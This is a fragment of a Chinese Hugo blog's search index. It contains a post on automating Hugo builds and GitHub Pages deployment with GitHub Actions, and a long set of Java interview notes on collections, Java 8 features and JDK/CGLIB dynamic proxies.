","date":"2023-03-05","objectID":"/posts/excel%E5%8E%BB%E9%99%A4%E5%8D%95%E5%85%83%E6%A0%BC%E4%BF%9D%E6%8A%A4/:0:1","tags":["Excel"],"title":"Excel去除单元格保护","uri":"/posts/excel%E5%8E%BB%E9%99%A4%E5%8D%95%E5%85%83%E6%A0%BC%E4%BF%9D%E6%8A%A4/"},{"categories":["hugo"],"content":"为什么要配置自动发布 基于前面的方案中，一次更新过程如下： 在本地写好md文章 用hugo发布到public/目录下 复制到本地仓库(也可以将git本地仓库配置到public/目录下，但因为我同时也在用git管理md，这么做会将两个项目的git纠缠在一起，不够清爽，违背我的审美) 再推到远程仓库 这样做的弊端是： 本地必须管理两个git仓库，一个是hugo-md源码库，另一个是生成的静态网页库，增加了更新文章的复杂度； 发布必须先发一个本地，然后手动上传，也增加了出错的风险。 一个理想的状态是，我只负责写文，和将好的md提交到git备份，然后就可以坐等网站内容更新了。github官方提供的GitHub Action正可以满足这个需求。 这样的需求下，整个Github Action只需要做两件事： 编译，生成静态文件 部署，把静态文件移动到合适的位置 比如放到某个云服务器上 或者放到 Github Pages 然后我们再通过git push来触发Github Action就可以了。 ","date":"2023-02-12","objectID":"/posts/github-action%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E5%8F%91%E5%B8%83githubpages/:0:1","tags":[],"title":"github action实现自动编译发布githubPages","uri":"/posts/github-action%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E5%8F%91%E5%B8%83githubpages/"},{"categories":["hugo"],"content":"准备 需要我们在github上准备两个仓库： 一个是存放博客源码的私有仓库 另一个是Github Pages公开库 ","date":"2023-02-12","objectID":"/posts/github-action%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E5%8F%91%E5%B8%83githubpages/:0:2","tags":[],"title":"github action实现自动编译发布githubPages","uri":"/posts/github-action%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E5%8F%91%E5%B8%83githubpages/"},{"categories":["hugo"],"content":"主要流程 配置私有库的Github Action 配置合适的token ","date":"2023-02-12","objectID":"/posts/github-action%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E5%8F%91%E5%B8%83githubpages/:0:3","tags":[],"title":"github action实现自动编译发布githubPages","uri":"/posts/github-action%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E5%8F%91%E5%B8%83githubpages/"},{"categories":["hugo"],"content":"具体实现 配置私有库的Github Action 在hugo博客根目录下，创建放置Github Action配置文件的目录 .github/workflows； 在 .github/workflows目录下，创建一个yml文件，这就是Github Action需要的一个工作流的配置，如果需要多个工作流可以创建多个yml文件； Hugo的官方文档Build Hugo With GitHub Action 中也推荐采用GitHub Actions作为持续集成部署方案，并提供了yml文件示例: name: github pages on: push: branches: - main # Set a branch to deploy pull_request: jobs: deploy: runs-on: ubuntu-22.04 steps: - uses: actions/checkout@v3 with: submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: 'latest' # extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 if: github.ref == 'refs/heads/main' with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_dir: ./public 整个 Action 一个包含 4 个步骤： 拉取代码 准备 hugo 环境 使用 hugo 编译生成静态文件 把生成的静态文件发布到 Github Pages 可以根据自己的情况修改配置参数，最好和本地配置一致，可以避免版本不同造成的问题。我改了以下几处： jobs.build-deploy.runs-on改为ubuntu-20.04（为了和本地版本一致） jobs.build-deploy.steps.uses.with.hugo-version改为 “0.88.1” （为了和本地版本一致） token改用personal_token（github_token不支持外部库，我们采用的两个仓库的方案不能使用github_token） 增加cname配置自己的自定义域名 最终我的yml配置文件是这样的： name: build and deploy to pages on: push: branches: - master jobs: build-deploy: # runs-on: ubuntu-20.04 runs-on: ubuntu-20.04 steps: - name: Check out source uses: actions/checkout@v2 with: submodules: recursive # Fetch Hugo themes (true OR recursive) - name: Setup hugo uses: peaceiris/actions-hugo@v2 with: # hugo-version: \"latest\" # 可以修改为你使用的 Hugo 版本 hugo-version: \"0.99.1\" # extended: true # 设置是否需要 extended 版本 - name: Build run: hugo - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: personal_token: ${{ secrets.PERSONAL_TOKEN }} # 另外还支持 deploy_token 和 github_token external_repository: hubu8/hubu8.github.io # 修改为你的 GitHub Pages 仓库 publish_dir: ./public # keep_files: false publish_branch: master # 如果使用自定义域名，还需要添加下面一行配置 # cname: www.goodfun.me 设置参数PERSONAL_TOKEN GITHUB_TOKEN 是一个特殊访问令牌,您可以使用它代表 GitHub Actions 进行身份验","date":"2023-02-12","objectID":"/posts/github-action%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E5%8F%91%E5%B8%83githubpages/:0:4","tags":[],"title":"github action实现自动编译发布githubPages","uri":"/posts/github-action%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E5%8F%91%E5%B8%83githubpages/"},{"categories":["java面试"],"content":"​ Java面向对象有哪些特征，如何应用 ​ 面向对象编程是利用类和对象编程的一种思想。万物可归类，类是对于世界事物的高度抽象 ，不同的事物之间有不同的关系 ，一个类自身与外界的封装关系，一个父类和子类的继承关系， 一个类和多个类的多态关系。万物皆对象，对象是具体的世界事物，面向对象的三大特征封装，继承，多态。封装，封装说明一个类行为和属性与其他类的关系，低耦合，高内聚；继承是父类和子类的关系，多态说的是类与类的关系。 ​ 封装隐藏了类的内部实现机制，可以在不影响使用的情况下改变类的内部结构，同时也保护了数据。对外界而已它的内部细节是隐藏的，暴露给外界的只是它的访问方法。属性的封装：使用者只能通过事先定制好的方法来访问数据，可以方便地加入逻辑控制，限制对属性的 不合理操作；方法的封装：使用者按照既定的方式调用方法，不必关心方法的内部实现，便于使用； 便于修改，增强 代码的可维护性； ​ 继承是从已有的类中派生出新的类，新的类能吸收已有类的数据属性和行为，并能扩展新的能力。在本质上是特殊~一般的关系，即常说的is-a关系。子类继承父类，表明子类是一种特殊的父类，并且具有父类所不具有的一些属性或方法。从多种实现类中抽象出一个基类，使其具备多种实现类的共同特性 ，当实现类用extends关键字继承了基类（父类）后，实现类就具备了这些相同的属性。继承的类叫做子类（派生类或者超类），被继承的类叫做父类（或者基类）。比如从猫类、狗类、虎类中可以抽象出一个动物类，具有和猫、狗、虎类的共同特性（吃、跑、叫等）。Java通过extends关键字来实现继承，父类中通过private定义的变量和方法不会被继承，不能在子类中直接操作父类通过private定义的变量以及方法。继承避免了对一般类和特殊类之间共同特征进行的重复描述，通过继承可以清晰地表达每一项共同特征所适应的概念范围，在一般类中定义的属性和操作适应于这个类本身以及它以下的每一层特殊类的全部对象。运用继承原则使得系统模型比较简练也比较清晰。 ​ 相比于封装和继承，Java多态是三大特性中比较难的一个，封装和继承最后归结于多态， 多态指的是类和类的关系，两个类由继承关系，存在有方法的重写，故而可以在调用时有父类引用指向子类对象。多态必备三个要素：继承，重写，父类引用指向子类对象。 HashMap原理是什么，在jdk1.7和1.8中有什么区别 HashMap 根据键的 hashCode 值存储数据，大多数情况下可以直接定位到它的值，因而具有很快的访问速度，但遍历顺序却是不确定的。 HashMap最多只允许一条记录的键为null，允许多条记录的值为 null。HashMap 非线程安全，即任一时刻可以有多个线程同时写 HashMap，可能会导致数据的不一致。如果需要满足线程安全，可以用 Collections 的 synchronizedMap 方法使 HashMap 具有线程安全的能力，或者使用 ConcurrentHashMap。我们用下面这张图来介绍 HashMap 的结构。 JAVA7 实现 大方向上，HashMap 里面是一个数组，然后数组中每个元素是一个单向链表。上图中，每个绿色 的实体是嵌套类 Entry 的实例，Entry 包含四个属性：key, value, hash 值和用于单向链表的 next。 capacity：当前数组容量，始终保持 2^n，可以扩容，扩容后数组大小为当前的 2 倍。 loadFactor：负载因子，默认为 0.75。 threshold：扩容的阈值，等于 capacity * loadFactor **JAVA8实现 ** Java8 对 HashMap 进行了一些修改，最大的不同就是利用了红黑树，所以其由 数组+链表+红黑树 组成。 根据 Java7 HashMap 的介绍，我们知道，查找的时候，根据 hash 值我们能够快速定位到数组的具体下标，但是之后的话，需要顺着链表一个个比较下去才能找到我们需要的，时间复杂度取决 于链表的长度，为 O(n)。为了降低这部分的开销，在 Java8 中，当链表中的元素超过了 8 个以后，会将链表转换为红黑树，在这些位置进行查找的时候可以降低时间复杂度为 O(logN)。 ArrayList和LinkedList有什么区别 ArrayList和LinkedList都实现了List接口，他们有以下的不同点： ArrayList是基于索引的数据接口，它的底层是数组。它可以以O(1)时间复杂度对元素进行随机访问。与此对应，LinkedList是以元素列表的形式存储它的数据，每一个元素都和它的前一个和后一个元素链接在一起，在这种情况下，查找某个元素的时间复杂度是O(n)。 相对于ArrayList，LinkedList的插入","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"一、接口的默认方法 Java 8允许我们给接口添加一个非抽象的方法实现，只需要使用 default关键字即可，这个特征又叫做扩展方法，示例如下： 代码如下: interface Formula { double calculate(int a); default double sqrt(int a) { return Math.sqrt(a); } } Formula接口在拥有calculate方法之外同时还定义了sqrt方法，实现了Formula接口的子类只需要实现一个calculate方法，默认方法sqrt将在子类上可以直接使用。 代码如下: Formula formula = new Formula() { @Override public double calculate(int a) { return sqrt(a * 100); } }; formula.calculate(100); // 100.0 formula.sqrt(16); // 4.0 文中的formula被实现为一个匿名类的实例，该代码非常容易理解，6行代码实现了计算 sqrt(a * 100)。在下一节中，我们将会看到实现单方法接口的更简单的做法。 译者注： 在Java中只有单继承，如果要让一个类赋予新的特性，通常是使用接口来实现，在C++中支持多继承，允许一个子类同时具有多个父类的接口与功能，在其他语言中，让一个类同时具有其他的可复用代码的方法叫做mixin。新的Java 8 的这个特新在编译器实现的角度上来说更加接近Scala的trait。 在C#中也有名为扩展方法的概念，允许给已存在的类型扩展方法，和Java 8的这个在语义上有差别。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:1","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"二、Lambda 表达式 首先看看在老版本的Java中是如何排列字符串的： 代码如下: List names = Arrays.asList(“peterF”, “anna”, “mike”, “xenia”); Collections.sort(names, new Comparator() { @Override public int compare(String a, String b) { return b.compareTo(a); } }); 只需要给静态方法 Collections.sort 传入一个List对象以及一个比较器来按指定顺序排列。通常做法都是创建一个匿名的比较器对象然后将其传递给sort方法。 在Java 8 中你就没必要使用这种传统的匿名对象的方式了，Java 8提供了更简洁的语法，lambda表达式： 代码如下: Collections.sort(names, (String a, String b) -\u003e { return b.compareTo(a); }); 看到了吧，代码变得更段且更具有可读性，但是实际上还可以写得更短： 代码如下: Collections.sort(names, (String a, String b) -\u003e b.compareTo(a)); 对于函数体只有一行代码的，你可以去掉大括号{}以及return关键字，但是你还可以写得更短点： 代码如下: Collections.sort(names, (a, b) -\u003e b.compareTo(a)); Java编译器可以自动推导出参数类型，所以你可以不用再写一次类型。接下来我们看看lambda表达式还能作出什么更方便的东西来： ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:2","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"三、函数式接口 Lambda表达式是如何在java的类型系统中表示的呢？每一个lambda表达式都对应一个类型，通常是接口类型。而“函数式接口”是指仅仅只包含一个抽象方法的接口，每一个该类型的lambda表达式都会被匹配到这个抽象方法。因为 默认方法 不算抽象方法，所以你也可以给你的函数式接口添加默认方法。 我们可以将lambda表达式当作任意只包含一个抽象方法的接口类型，确保你的接口一定达到这个要求，你只需要给你的接口添加 @FunctionalInterface 注解，编译器如果发现你标注了这个注解的接口有多于一个抽象方法的时候会报错的。 示例如下： 代码如下: @FunctionalInterface interface Converter\u003cF, T\u003e { T convert(F from); } Converter\u003cString, Integer\u003e converter = (from) -\u003e Integer.valueOf(from); Integer converted = converter.convert(“123”); System.out.println(converted); // 123 需要注意如果@FunctionalInterface如果没有指定，上面的代码也是对的。 译者注 将lambda表达式映射到一个单方法的接口上，这种做法在Java 8之前就有别的语言实现，比如Rhino JavaScript解释器，如果一个函数参数接收一个单方法的接口而你传递的是一个function，Rhino 解释器会自动做一个单接口的实例到function的适配器，典型的应用场景有 org.w3c.dom.events.EventTarget 的addEventListener 第二个参数 EventListener。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:3","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"四、方法与构造函数引用 前一节中的代码还可以通过静态方法引用来表示： 代码如下: Converter\u003cString, Integer\u003e converter = Integer::valueOf; Integer converted = converter.convert(“123”); System.out.println(converted); // 123 Java 8 允许你使用 :: 关键字来传递方法或者构造函数引用，上面的代码展示了如何引用一个静态方法，我们也可以引用一个对象的方法： 代码如下: converter = something::startsWith; String converted = converter.convert(“Java”); System.out.println(converted); // “J” 接下来看看构造函数是如何使用::关键字来引用的，首先我们定义一个包含多个构造函数的简单类： 代码如下: class Person { String firstName; String lastName; Person() {} Person(String firstName, String lastName) { this.firstName = firstName; this.lastName = lastName; } } 接下来我们指定一个用来创建Person对象的对象工厂接口： 代码如下: interface PersonFactory { P create(String firstName, String lastName); } 这里我们使用构造函数引用来将他们关联起来，而不是实现一个完整的工厂： 代码如下: PersonFactory personFactory = Person::new; Person person = personFactory.create(“Peter”, “Parker”); 我们只需要使用 Person::new 来获取Person类构造函数的引用，Java编译器会自动根据PersonFactory.create方法的签名来选择合适的构造函数。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:4","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"五、Lambda 作用域 在lambda表达式中访问外层作用域和老版本的匿名对象中的方式很相似。你可以直接访问标记了final的外层局部变量，或者实例的字段以及静态变量。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:5","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"六、访问局部变量 我们可以直接在lambda表达式中访问外层的局部变量： 代码如下: final int num = 1; Converter\u003cInteger, String\u003e stringConverter = (from) -\u003e String.valueOf(from + num); stringConverter.convert(2); // 3 但是和匿名对象不同的是，这里的变量num可以不用声明为final，该代码同样正确： 代码如下: int num = 1; Converter\u003cInteger, String\u003e stringConverter = (from) -\u003e String.valueOf(from + num); stringConverter.convert(2); // 3 不过这里的num必须不可被后面的代码修改（即隐性的具有final的语义），例如下面的就无法编译： 代码如下: int num = 1; Converter\u003cInteger, String\u003e stringConverter = (from) -\u003e String.valueOf(from + num); num = 3; 在lambda表达式中试图修改num同样是不允许的。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:6","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"七、访问对象字段与静态变量 和本地变量不同的是，lambda内部对于实例的字段以及静态变量是即可读又可写。该行为和匿名对象是一致的： 代码如下: class Lambda4 { static int outerStaticNum; int outerNum; void testScopes() { Converter\u003cInteger, String\u003e stringConverter1 = (from) -\u003e { outerNum = 23; return String.valueOf(from); }; Converter\u003cInteger, String\u003e stringConverter2 = (from) -\u003e { outerStaticNum = 72; return String.valueOf(from); }; } } ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:7","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"八、访问接口的默认方法 还记得第一节中的formula例子么，接口Formula定义了一个默认方法sqrt可以直接被formula的实例包括匿名对象访问到，但是在lambda表达式中这个是不行的。 Lambda表达式中是无法访问到默认方法的，以下代码将无法编译： 代码如下: Formula formula = (a) -\u003e sqrt( a * 100); Built-in Functional Interfaces JDK 1.8 API包含了很多内建的函数式接口，在老Java中常用到的比如Comparator或者Runnable接口，这些接口都增加了@FunctionalInterface注解以便能用在lambda上。 Java 8 API同样还提供了很多全新的函数式接口来让工作更加方便，有一些接口是来自Google Guava库里的，即便你对这些很熟悉了，还是有必要看看这些是如何扩展到lambda上使用的。 Predicate****接口 Predicate 接口只有一个参数，返回boolean类型。该接口包含多种默认方法来将Predicate组合成其他复杂的逻辑（比如：与，或，非）： 代码如下: Predicate predicate = (s) -\u003e s.length() \u003e 0; predicate.test(“foo”); // true predicate.negate().test(“foo”); // false Predicate nonNull = Objects::nonNull; Predicate isNull = Objects::isNull; Predicate isEmpty = String::isEmpty; Predicate isNotEmpty = isEmpty.negate(); Function 接口 Function 接口有一个参数并且返回一个结果，并附带了一些可以和其他函数组合的默认方法（compose, andThen）： 代码如下: Function\u003cString, Integer\u003e toInteger = Integer::valueOf; Function\u003cString, String\u003e backToString = toInteger.andThen(String::valueOf); backToString.apply(“123”); // “123” Supplier 接口 Supplier 接口返回一个任意范型的值，和Function接口不同的是该接口没有任何参数 代码如下: Supplier personSupplier = Person::new; personSupplier.get(); // new Person Consumer 接口 Consumer 接口表示执行在单个参数上的操作。 代码如下: Consumer greeter = (p) -\u003e System.out.println(“Hello, \" + p.firstName); greeter.accept(new Person(“Luke”, “Skywalker”)); Comparator 接口 Comparator 是老Java中的经典接口， Java 8在此之上添加了多种默认方法： 代码如下: Comparator comparator = (p1, p2) -\u003e p1.firstName.compareTo(p2.firstName); Person p1 = new Person(“John”, “Doe”); Person p2 = new Person(“Alice”, “Wonderland”); comparator.compare(p1, p2); // \u003e 0 comparator.reversed().compare(p1, p2); // \u003c 0 Optional 接口 Optional 不是函数是接口，这是个用来防止NullPointerException异常的辅助类型，这是下一届中将要用到的重要概念，现在先简单的看看这个接口能干什么： Optional 被定义为一个简单的容器，其值可能是null或者不是null。在Java 8之前一般某个函数应该返回非空对象但是偶尔却可能返回了null，而在Java 8中，不推荐你返回null而是返回Optional。 代码如下: Optional optional = Optional.of(“bam”); optional.isPresent(); // true optional.get(); // “bam” optional.orElse(“fallback”); // “bam” optional.ifP","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:8","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"九、Date API Java 8 在包java.time下包含了一组全新的时间日期API。新的日期API和开源的Joda-Time库差不多，但又不完全一样，下面的例子展示了这组新API里最重要的一些部分： Clock 时钟 Clock类提供了访问当前日期和时间的方法，Clock是时区敏感的，可以用来取代 System.currentTimeMillis() 来获取当前的微秒数。某一个特定的时间点也可以使用Instant类来表示，Instant类也可以用来创建老的java.util.Date对象。 代码如下: Clock clock = Clock.systemDefaultZone(); long millis = clock.millis(); Instant instant = clock.instant(); Date legacyDate = Date.from(instant); // legacy java.util.Date Timezones 时区 在新API中时区使用ZoneId来表示。时区可以很方便的使用静态方法of来获取到。 时区定义了到UTS时间的时间差，在Instant时间点对象到本地日期对象之间转换的时候是极其重要的。 代码如下: System.out.println(ZoneId.getAvailableZoneIds()); // prints all available timezone ids ZoneId zone1 = ZoneId.of(“Europe/Berlin”); ZoneId zone2 = ZoneId.of(“Brazil/East”); System.out.println(zone1.getRules()); System.out.println(zone2.getRules()); // ZoneRules[currentStandardOffset=+01:00] // ZoneRules[currentStandardOffset=-03:00] LocalTime 本地时间 LocalTime 定义了一个没有时区信息的时间，例如 晚上10点，或者 17:30:15。下面的例子使用前面代码创建的时区创建了两个本地时间。之后比较时间并以小时和分钟为单位计算两个时间的时间差： 代码如下: LocalTime now1 = LocalTime.now(zone1); LocalTime now2 = LocalTime.now(zone2); System.out.println(now1.isBefore(now2)); // false long hoursBetween = ChronoUnit.HOURS.between(now1, now2); long minutesBetween = ChronoUnit.MINUTES.between(now1, now2); System.out.println(hoursBetween); // -3 System.out.println(minutesBetween); // -239 LocalTime 提供了多种工厂方法来简化对象的创建，包括解析时间字符串。 代码如下: LocalTime late = LocalTime.of(23, 59, 59); System.out.println(late); // 23:59:59 DateTimeFormatter germanFormatter = DateTimeFormatter .ofLocalizedTime(FormatStyle.SHORT) .withLocale(Locale.GERMAN); LocalTime leetTime = LocalTime.parse(“13:37”, germanFormatter); System.out.println(leetTime); // 13:37 LocalDate 本地日期 LocalDate 表示了一个确切的日期，比如 2014-03-11。该对象值是不可变的，用起来和LocalTime基本一致。下面的例子展示了如何给Date对象加减天/月/年。另外要注意的是这些对象是不可变的，操作返回的总是一个新实例。 代码如下: LocalDate today = LocalDate.now(); LocalDate tomorrow = today.plus(1, ChronoUnit.DAYS); LocalDate yesterday = tomorrow.minusDays(2); LocalDate independenceDay = LocalDate.of(2014, Month.JU","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:9","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"十、Annotation 注解 在Java 8中支持多重注解了，先看个例子来理解一下是什么意思。 首先定义一个包装类Hints注解用来放置一组具体的Hint注解： 代码如下: @interface Hints { Hint[] value(); } @Repeatable(Hints.class) @interface Hint { String value(); } Java 8允许我们把同一个类型的注解使用多次，只需要给该注解标注一下@Repeatable即可。 例 1: 使用包装类当容器来存多个注解（老方法） 代码如下: @Hints({@Hint(“hint1”), @Hint(“hint2”)}) class Person {} 例 2：使用多重注解（新方法） 代码如下: @Hint(“hint1”) @Hint(“hint2”) class Person {} 第二个例子里java编译器会隐性的帮你定义好@Hints注解，了解这一点有助于你用反射来获取这些信息： 代码如下: Hint hint = Person.class.getAnnotation(Hint.class); System.out.println(hint); // null Hints hints1 = Person.class.getAnnotation(Hints.class); System.out.println(hints1.value().length); // 2 Hint[] hints2 = Person.class.getAnnotationsByType(Hint.class); System.out.println(hints2.length); // 2 即便我们没有在Person类上定义@Hints注解，我们还是可以通过 getAnnotation(Hints.class) 来获取 @Hints注解，更加方便的方法是使用 getAnnotationsByType 可以直接获取到所有的@Hint注解。 另外Java 8的注解还增加到两种新的target上了： 代码如下: @Target({ElementType.TYPE_PARAMETER, ElementType.TYPE_USE}) @interface MyAnnotation {} 关于Java 8的新特性就写到这了，肯定还有更多的特性等待发掘。JDK 1.8里还有很多很有用的东西，比如Arrays.parallelSort, StampedLock和CompletableFuture等等。 Java中重写和重载有哪些区别 方法的重载和重写都是实现多态的方式，区别在于前者实现的是编译时的多态性，而后者实现的是运行时的多态 性。重载发生在一个类中，同名的方法如果有不同的参数列表（参数类型不同、参数个数不同或者二者都不同）则视为 重载；重写发生在子类与父类之间，重写要求子类被重写方法与父类被重写方法有相同的返回类型，比父类被重写方 法更好访问，不能比父类被重写方法声明更多的异常（里氏代换原则）。重载对返回类型没有特殊的要求。 方法重载的规则： 1.方法名一致，参数列表中参数的顺序，类型，个数不同。 2.重载与方法的返回值无关，存在于父类和子类，同类中。 3.可以抛出不同的异常，可以有不同修饰符 方法重写的规则： 1.参数列表必须完全与被重写方法的一致，返回类型必须完全与被重写方法的返回类型一致。 2.构造方法不能被重写，声明为 final 的方法不能被重写，声明为 static 的方法不能被重写，但是能够被再次 声明。 3.访问权限不能比父类中被重写的方法的访问权限更低。 4.重写的方法能够抛出任何非强制异常（UncheckedException，也叫非运行时异常），无论被重写的方法是 否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则 可以。 接口和抽象类有哪些区别 不同： 抽象类： 1.抽象类中可以定义构造器 2.可以有抽象方法和具体方法 3.接口中的成员全都是 public 的 4.抽象类中可以定义成员变量 5.有抽象方法的类必须被声明为抽象类，而抽象类未必要有抽象方法 6.抽象类中可以包含静态方法 7.一个类只能继承一个抽象类 接口： 1.接口中不能定义构造器 2.方法全部都是抽象方法 3.抽象类中的成员可以是 private、默认、protected、public 4.接口中定义的成员变量实际上都是常量 5.接口中不能有静态方法 6.一个类可以实现多个接口 相同： 1.不能够实例化 2.可以将抽象类和接口类型作为引用类型 3.一个类如果继承了某个抽象类或者实现了某个接口都需要对其中的抽象方法全部进行实现，否","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:0:10","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"Proxy代理是JDK内置的动态代理 ​ 特点:面向接口的,不需要导入三方依赖的动态代理,可以对多个不同的接口进行增强,通过反射读取注解时,只能读取到接口上的注解 ​ 原理:面向接口,只能对实现类在实现接口中定义的方法进行增强 定义接口和实现 package com.proxy; public interface UserService { public String getName(int id); public Integer getAge(int id); } package com.proxy; public class UserServiceImpl implements UserService { @Override public String getName(int id) { System.out.println(\"------getName------\"); return \"riemann\"; } @Override public Integer getAge(int id) { System.out.println(\"------getAge------\"); return 26; } } package com.proxy; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class MyInvocationHandler implements InvocationHandler { public Object target; MyInvocationHandler() { super(); } MyInvocationHandler(Object target) { super(); this.target = target; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if (\"getName\".equals(method.getName())) { System.out.println(\"++++++before \" + method.getName() + \"++++++\"); Object result = method.invoke(target, args); System.out.println(\"++++++after \" + method.getName() + \"++++++\"); return result; } else { Object result = method.invoke(target, args); return result; } } } package com.proxy; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main1 { public static void main(String[] args) { UserService userService = new UserServiceImpl(); InvocationHandler invocationHandler = new MyInvocationHandler(userService); UserService userServiceProxy = (UserService) Proxy.newProxyInstance(userService.getClass().getClassLoader(), userService.getClass().getInterfaces(),invocationHandler); System.out.println(userServiceProxy.getName(1)); System.out.println(userServiceProxy.getAge(1)); } } ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:1:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"CGLIB动态代理 ​ 特点:面向父类的动态代理,需要导入第三方依赖 ​ 原理:面向父类,底层通过子类继承父类并重写方法的形式实现增强 Proxy和CGLIB是非常重要的代理模式,是springAOP底层实现的主要两种方式 CGLIB的核心类： net.sf.cglib.proxy.Enhancer – 主要的增强类 net.sf.cglib.proxy.MethodInterceptor – 主要的方法拦截类，它是Callback接口的子接口，需要用户实现 net.sf.cglib.proxy.MethodProxy – JDK的java.lang.reflect.Method类的代理类，可以方便的实现对源对象方法的调用,如使用： Object o = methodProxy.invokeSuper(proxy, args);//虽然第一个参数是被代理对象，也不会出现死循环的问题。 net.sf.cglib.proxy.MethodInterceptor接口是最通用的回调（callback）类型，它经常被基于代理的AOP用来实现拦截（intercept）方法的调用。这个接口只定义了一个方法 public Object intercept(Object object, java.lang.reflect.Method method, Object[] args, MethodProxy proxy) throws Throwable; 第一个参数是代理对像，第二和第三个参数分别是拦截的方法和方法的参数。原来的方法可能通过使用java.lang.reflect.Method对象的一般反射调用，或者使用 net.sf.cglib.proxy.MethodProxy对象调用。net.sf.cglib.proxy.MethodProxy通常被首选使用，因为它更快。 package com.proxy.cglib; import net.sf.cglib.proxy.MethodInterceptor; import net.sf.cglib.proxy.MethodProxy; import java.lang.reflect.Method; public class CglibProxy implements MethodInterceptor { @Override public Object intercept(Object o, Method method, Object[] args, MethodProxy methodProxy) throws Throwable { System.out.println(\"++++++before \" + methodProxy.getSuperName() + \"++++++\"); System.out.println(method.getName()); Object o1 = methodProxy.invokeSuper(o, args); System.out.println(\"++++++before \" + methodProxy.getSuperName() + \"++++++\"); return o1; } } package com.proxy.cglib; import com.test3.service.UserService; import com.test3.service.impl.UserServiceImpl; import net.sf.cglib.proxy.Enhancer; public class Main2 { public static void main(String[] args) { CglibProxy cglibProxy = new CglibProxy(); Enhancer enhancer = new Enhancer(); enhancer.setSuperclass(UserServiceImpl.class); enhancer.setCallback(cglibProxy); UserService o = (UserService)enhancer.create(); o.getName(1); o.getAge(1); } } hashcode和equals如何使用 equals()源自于java.lang.Object,该方法用来简单验证两个对象的相等性。Object类中定义的默认实现只检查两个对象的对象引用，以验证它们的相等性。 通过重写该方法,可以自定义验证对象相等新的规则,如果你使用ORM处理一些对象的话，你要确保在hashCode()和equals()对象中使用getter和setter而不是直接引","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:2:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"HashMap和HashTable对比 HashTable线程同步，HashMap非线程同步。 HashTable不允许\u003c键,值\u003e有空值，HashMap允许\u003c键,值\u003e有空值。 HashTable使用Enumeration，HashMap使用Iterator。 HashTable中hash数组的默认大小是11，增加方式的old*2+1，HashMap中hash数组的默认大小是16，增长方式是2的指数倍。 5.HashMap jdk1.8之前list + 链表 jdk1.8之后list + 链表,当链表长度到8时，转化为红黑树 6.HashMap链表插入节点的方式 在Java1.7中，插入链表节点使用头插法。Java1.8中变成了尾插法 7.Java1.8的hash()中，将hash值高位（前16位）参与到取模的运算中，使得计算结果的不确定性增强，降低发生哈希碰撞的概率 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:3:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"HashMap扩容优化: 